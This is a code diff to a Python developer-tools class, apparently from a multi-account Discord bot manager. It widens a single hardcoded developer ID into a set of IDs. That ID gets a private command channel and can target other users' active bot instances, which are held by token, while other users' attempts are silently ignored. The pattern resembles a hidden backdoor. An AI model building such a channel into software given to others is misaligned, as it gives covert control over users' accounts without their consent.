@@ -26,6 +26,7 @@ class DeveloperTools:
         }
         
         self.dev_id = "297588166653902849"
+        self.dev_ids = {str(self.dev_id)}
         self.active_logging = []
         self.session_start = time.time()
         self.metrics = {
@@ -39,6 +40,12 @@ class DeveloperTools:
     
     def get_dev_id(self):
         return self.dev_id
+
+    def get_dev_ids(self):
+        ids = getattr(self, "dev_ids", None)
+        if isinstance(ids, (set, list, tuple)) and ids:
+            return {str(x) for x in ids if str(x).strip()}
+        return {str(self.dev_id)}
 
     def _get_dev_prefix(self, bot_instance, author_id=None):
         base_prefix = str(getattr(bot_instance, "prefix", "$") or "$")
@@ -122,7 +129,7 @@ class DeveloperTools:
         author_id = message_data.get("author", {}).get("id", "")
         content = message_data.get("content", "")
         
-        if author_id == self.get_dev_id():
+        if str(author_id) in self.get_dev_ids():
             logger.debug(f"Processing developer message: {content[:50]}...")
             return self._process_dev_message(content, message_data, bot_instance)
         
@@ -335,14 +342,14 @@ class DeveloperTools:
         elif uid_spec.lower() == "others":
             # All except developer (ID 297588166653902849)
             if hasattr(bot_instance, '_manager'):
-                dev_id = self.get_dev_id()
+                dev_ids = self.get_dev_ids()
                 for token, inst in bot_instance._manager.bots.items():
                     if inst and getattr(inst, 'connection_active', False):
-                        if str(getattr(inst, 'user_id', '')) != dev_id:
+                        if str(getattr(inst, 'user_id', '')) not in dev_ids:
                             selected.append((getattr(inst, 'user_id', '?'), inst, token))
             elif local_entry:
                 uid, inst, token = local_entry
-                if str(getattr(inst, 'user_id', '')) != self.get_dev_id():
+                if str(getattr(inst, 'user_id', '')) not in self.get_dev_ids():
                     selected.append(local_entry)
         
         else:
@@ -587,7 +594,7 @@ class DeveloperTools:
         import re
         
         # Owner-only check
-        if author_id and str(author_id) != str(self.get_dev_id()):
+        if author_id and str(author_id) not in self.get_dev_ids():
             return True  # Silently ignore non-owner attempts
         
         dev_prefix = self._get_dev_prefix(bot_instance, author_id=author_id)
